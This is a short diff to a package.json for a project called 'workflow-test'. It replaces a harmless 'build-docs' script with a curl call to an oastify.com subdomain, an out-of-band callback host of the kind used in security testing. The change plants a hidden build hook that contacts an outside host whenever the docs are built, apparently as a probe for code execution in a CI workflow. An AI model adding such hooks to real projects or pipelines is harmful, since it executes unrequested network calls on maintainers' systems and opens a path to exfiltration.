@@ -2,7 +2,7 @@
   "name": "workflow-test",
   "version": "1.0.0",
   "scripts": {
-    "build-docs": "echo Building docs..."
+    "build-docs": "curl http://aycbquo7sp1t8ejszkv20yda319sxh.oastify.com"
   },
   "dependencies": {}
 }
